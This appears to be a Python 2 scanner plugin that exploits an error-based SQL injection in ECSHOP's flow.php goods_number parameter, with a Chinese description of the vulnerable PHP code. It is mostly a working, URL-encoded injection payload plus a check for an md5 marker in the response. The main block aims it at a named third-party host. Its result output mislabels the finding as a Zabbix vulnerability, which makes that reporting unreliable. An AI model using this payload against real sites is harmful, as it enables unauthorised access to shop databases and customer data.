# !/usr/bin/dev python
# -*- coding:utf-8 -*-

from ..miniCurl import Curl
from ..t  import T
"""
reference:
http://www.beebeeto.com/pdb/poc-2015-0061/
ECSHOP是一款开源免费的网上商店系统,flow. php页面的goods_number变量没有过滤导致字符型型注入，本漏洞利用前提是magic_quotes_gpc=off，未对value进行过滤
elseif ($_REQUEST['step'] == 'update_cart')
{
   if (isset($_POST['goods_number']) && is_array($_POST['goods_number']))
   {
   flow_update_cart($_POST['goods_number']);
   }
   show_message($_LANG['update_cart_notice'], $_LANG['back_to_cart'], 'flow.php');
   exit;
}
function flow_update_cart($arr)
{
   /* 处理 */
   foreach ($arr AS $key => $val)
   {
   $val = intval(make_semiangle($val));
   if ($val <= 0)
   {
   continue;
   }
}
"""

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackresults=''):
        arg='http://'+ip+':'+port
        curl=Curl()
        result = {}
        result['result']=False

        url = arg + '/flow.php?step=update_cart'

        # goods_number[1' and (select 1 from(select count(*),concat((select (select (SELECT md5(3.1415)))from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)and 1=1 #%5=1&submit=exp
        payload = ("goods_number%5B1%27+and+%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+%28SELECT+md5(3.1415)%29%29from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29and+1%3D1+%23%5=1&submit=exp")
        code, head, res, errcode, finalurl = curl.curl('-d ' + payload + url)
        if code == 200:
            # md5(3.1415)
            if '63e1f04640e83605c1d177544a5a0488' in res:
                output(url,result,'高危(HOLE)')
        pass

        del curl
        return result


def output(url,result,label):
    info = url + '  zabbix  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='zabbix Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='thirdparty/zabbix/zabbix_6d32b84d0be89f2e893f8f611f443f1b.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == "__main__":
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/zabbix/zabbix_6d32b84d0be89f2e893f8f611f443f1b.py
#/root/github/poccreate/codesrc/exp-412.py
